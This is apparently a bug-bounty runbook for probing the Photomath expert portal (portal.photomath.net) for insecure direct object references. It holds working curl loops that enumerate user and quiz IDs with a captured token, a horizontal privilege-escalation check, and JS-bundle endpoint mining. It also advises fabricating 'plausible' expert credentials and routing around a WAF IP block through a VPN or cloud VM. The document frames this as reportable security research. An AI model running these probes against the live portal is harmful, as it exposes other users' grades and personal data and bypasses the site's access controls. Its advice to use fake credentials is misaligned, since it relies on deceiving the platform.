# Pi Runbook — Photomath Portal IDOR Session 3
# Goal: Register expert account, obtain auth token, test IDOR on integer user/quiz IDs
# Lead: L004 — /api/quiz/grade-quizzes/user/273638 (integer user ID in URL)
# Date: 2026-06-21
# REQUIRES: Desktop browser + Burp Suite (Pi IP blocked at TCP by portal.photomath.net)

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# ============================================================
# PRECONDITION — This runbook is for DESKTOP execution with Burp, NOT Pi-only
# Pi TCP is blocked by portal.photomath.net GCP GCLB WAF.
# Use a machine with non-Pi IP or proxy through a cloud VM / VPN.
# ============================================================

# ============================================================
# STEP 1 — Register Expert Account (browser)
# ============================================================
# 1a. Open browser → https://portal.photomath.net
# 1b. Click "Become an Expert" or "Sign Up"
# 1c. Register with a fresh Gmail test account (e.g. photomath-test-1@gmail.com)
# 1d. Complete expert onboarding (may require uploading math credentials — use plausible info)
# 1e. Once inside dashboard, enable Burp Suite proxy (127.0.0.1:8080)

# ============================================================
# STEP 2 — Capture authenticated requests with Burp
# ============================================================
# Navigate to these pages and capture the full request/response in Burp:
# - /home (expert dashboard)
# - /expert-training/qualification-quiz/[any-ID]
# - /expert-training/courses
# - Any profile, settings, or assignment endpoints

# KEY: Extract the Authorization header value from any request
# It should be: Authorization: Bearer <JWT-or-opaque-token>
# Save it as: AUTH_TOKEN=<value>

# ============================================================
# STEP 3 — Identify integer object IDs (Burp / curl with token)
# ============================================================

# After extracting token, run these from Pi (or desktop with Burp):
AUTH_TOKEN="REPLACE_WITH_CAPTURED_TOKEN"

# IDOR test on quiz grades — known integer user ID 273638 from URL mining
# If authenticated as user X, try to access user 273638's data:
for UID in 1 100 1000 10000 273637 273638 273639 300000 500000; do
  echo "=== User ID $UID ==="
  curl -sk --max-time 10 \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -H "Accept: application/json" \
    "https://portal.photomath.net/api/quiz/grade-quizzes/user/$UID" | python3 -m json.tool 2>/dev/null | head -20
done

# IDOR test on expert profile endpoints
for UID in 1 100 1000 10000 273638; do
  echo "=== Expert profile $UID ==="
  curl -sk --max-time 10 \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -H "Accept: application/json" \
    "https://portal.photomath.net/api/users/$UID" | python3 -m json.tool 2>/dev/null | head -20
done

# IDOR test on quiz content — if quiz IDs are sequential, can access other experts' quizzes
for QID in 1 2 3 100 147 200 500 1000; do
  echo "=== Quiz $QID ==="
  curl -sk --max-time 10 \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -H "Accept: application/json" \
    "https://portal.photomath.net/api/quiz/$QID" | python3 -m json.tool 2>/dev/null | head -20
done

# Qualification quiz IDOR — access quiz content before authorized
for QID in 1 2 3 4 5; do
  echo "=== Qual Quiz $QID ==="
  curl -sk --max-time 10 \
    -H "Authorization: Bearer $AUTH_TOKEN" \
    -H "Accept: application/json" \
    "https://portal.photomath.net/api/expert-training/qualification-quiz/$QID" | python3 -m json.tool 2>/dev/null | head -20
done

# ============================================================
# STEP 4 — Horizontal privilege escalation
# ============================================================
# If account A has quiz grade for quiz Q, can account B read it?
# Test: Create a SECOND test account (expert B), get its token, then:
AUTH_TOKEN_B="REPLACE_WITH_ACCOUNT_B_TOKEN"
OWN_USER_ID_A="REPLACE_WITH_ACCOUNT_A_USER_ID"

curl -sk --max-time 10 \
  -H "Authorization: Bearer $AUTH_TOKEN_B" \
  -H "Accept: application/json" \
  "https://portal.photomath.net/api/quiz/grade-quizzes/user/$OWN_USER_ID_A"

# If this returns account A's quiz data → CONFIRMED IDOR (horizontal privilege esc)

# ============================================================
# STEP 5 — JS bundle mining (if portal loads)
# ============================================================
# From Burp, extract the JS bundle URLs and fetch them for hidden endpoints:
# curl -sk "https://portal.photomath.net/static/js/main.[hash].js" -o portal-main.js
# grep -oE '"/(api|v1|v2)[^"]*"' portal-main.js | sort -u | head -50

# ============================================================
# VERDICT CRITERIA:
# - If accessing ANOTHER USER's quiz grades/answers → IDOR (CVSS 6.5 Medium → report)
# - If quiz questions/answers accessible before authorized (bypasses progression gating) → report
# - If any 200 response with another user's PII → IDOR (TIER0 → payout)
# ============================================================
